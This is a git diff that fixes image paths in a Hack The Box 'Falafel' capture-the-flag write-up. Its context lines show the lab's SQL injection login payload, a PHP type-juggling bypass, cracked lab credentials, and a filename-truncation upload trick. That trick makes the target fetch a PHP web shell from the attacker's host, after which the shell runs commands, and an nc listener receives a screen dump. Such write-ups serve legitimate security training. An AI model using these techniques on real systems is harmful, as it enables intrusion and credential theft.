@@ -1,4 +1,4 @@
-![](Assets\HTB-Linux-Hard-Falafel\f9106389d256a42cf41619e85fbd8f01.webp)
+![](Assets/HTB-Linux-Hard-Falafel/f9106389d256a42cf41619e85fbd8f01.webp)
 
 # Writeup of _Falafel_
 
@@ -10,23 +10,21 @@
 
 ---
 
----
-
 # Enumeration
 
 ## Nmap
 
 For enumeration, after verifying the connection, I always do a nmap scan like this:
 
-![allPorts](Assets\HTB-Linux-Hard-Falafel\allPorts.png)
+![allPorts](Assets/HTB-Linux-Hard-Falafel/allPorts.png)
 
-![nmap-A](Assets\HTB-Linux-Hard-Falafel\nmap-A.png)
+![nmap-A](Assets/HTB-Linux-Hard-Falafel/nmap-A.png)
 
 We have only ssh and 1 http port. The version of ssh have not big vulnerabilities, so the target is the port 80
 
 ## WebSite
 
-![Website - First page](Assets\HTB-Linux-Hard-Falafel\website-1.png)
+![Website - First page](Assets/HTB-Linux-Hard-Falafel/website-1.png)
 
 This site give some information. We have a email (IT@falafel.htb) and with this email, we can suspect potential user (IT) and virtual hosting (falafel.htb). let add this host on /etc/hosts
 
@@ -81,7 +79,7 @@ ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-l
 
 Whats is cyberlaw.txt?!
 
-![cyberlaw.txt](Assets\HTB-Linux-Hard-Falafel\cyberlaw.png)
+![cyberlaw.txt](Assets/HTB-Linux-Hard-Falafel/cyberlaw.png)
 
 That give us a lot of potential information...
 
@@ -92,7 +90,7 @@ That give us a lot of potential information...
 
 After opening http://falafel.htb/ from the browser, we have a button login. if with put "admin" "admin" for user and password, we get an error "Wrong identification : admin". Another random username give us "Try again..". We can assume that the user "admin" existe.
 
-![admin login try](Assets\HTB-Linux-Hard-Falafel\admin-login-try.png)
+![admin login try](Assets/HTB-Linux-Hard-Falafel/admin-login-try.png)
 
 If we put user "' or 1=1 -- -" and password "' or 1=1 -- -", we get the same error "Wrong identification : admin". Maybe it is vulnerable to SQLi.
 
@@ -162,11 +160,11 @@ The script give us 2 hashes:
 
 with online tool called crackstation.net, we got 1 password:
 
-![crack station](Assets\HTB-Linux-Hard-Falafel\Crackstation.png)
+![crack station](Assets/HTB-Linux-Hard-Falafel/Crackstation.png)
 
 > chris:juggling
 
-![Login Chris](Assets\HTB-Linux-Hard-Falafel\login_chris.png)
+![Login Chris](Assets/HTB-Linux-Hard-Falafel/login_chris.png)
 
 The Chris perfile have a tip. _TYPE-JUGGLING_
 
@@ -176,7 +174,7 @@ The admin hash is 0e462096931906507119562988736854. in php, the string "0e462096
 
 I am in!
 
-![logged as admin](Assets\HTB-Linux-Hard-Falafel\login_admin.png)
+![logged as admin](Assets/HTB-Linux-Hard-Falafel/login_admin.png)
 
 ### RCE
 
@@ -193,7 +191,7 @@ We can update an image with png extention. but the response is very unusual. Tha
 # Copy the real image with 251 pattern char and last 4 chars as .png (255 chars)
 cp shell.png $(msf-pattern_create -l 251).png  
 ```
-![Output wget](Assets\HTB-Linux-Hard-Falafel\output_wget.png)
+![Output wget](Assets/HTB-Linux-Hard-Falafel/output_wget.png)
 
 The Output say literally the last 4 chars of the new name file is h7Ah
 
@@ -221,13 +219,13 @@ In upload page, get the file and save the output...
 
 > http://10.10.14.17/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png
 
-![uploaded web shell](Assets\HTB-Linux-Hard-Falafel\good_upload.png)
+![uploaded web shell](Assets/HTB-Linux-Hard-Falafel/good_upload.png)
 
 Note the path of the file and go to the webshell
 
 >http://10.10.10.73/uploads/0909-2054_bd1a63d419ed6bf6/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php?cmd=whoami
 
-![whoami web shell](Assets\HTB-Linux-Hard-Falafel\whoami_web_shell.png)
+![whoami web shell](Assets/HTB-Linux-Hard-Falafel/whoami_web_shell.png)
 
 We Have Remote Code Execution!
 
@@ -300,11 +298,11 @@ nc -lvnp 443 > screen.raw             # kali Machine
 ```
 open with GIMP in mode RAW
 
-![opennig image raw format with GIMP](Assets\HTB-Linux-Hard-Falafel\Openning_raw_image.png)
+![opennig image raw format with GIMP](Assets/HTB-Linux-Hard-Falafel/Openning_raw_image.png)
 
-![Select size of raw image](Assets\HTB-Linux-Hard-Falafel\select_size_raw_image.png)
+![Select size of raw image](Assets/HTB-Linux-Hard-Falafel/select_size_raw_image.png)
 
-![Password yossi](Assets\HTB-Linux-Hard-Falafel\yossi_password.png)
+![Password yossi](Assets/HTB-Linux-Hard-Falafel/yossi_password.png)
 
 We can now ssh into target machine with yossi user
 
